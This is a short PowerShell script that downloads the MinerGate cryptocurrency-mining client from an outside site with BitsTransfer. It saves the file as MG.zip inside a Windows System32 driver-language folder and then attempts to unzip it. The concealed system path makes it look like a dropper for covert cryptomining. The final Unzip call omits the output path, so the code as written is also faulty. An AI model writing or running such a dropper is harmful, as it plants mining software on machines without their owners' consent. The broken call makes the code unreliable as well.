# Download
$url2 = "https://minergate.com/download/win"
$output2 = "C:\Windows\System32\drivers\en-US\MG.zip"
Import-Module BitsTransfer
Start-BitsTransfer -Source $url2 -Destination $output2

#Extract
Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip
{
    param([string]$zipfile, [string]$outpath)
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}
Unzip $output2
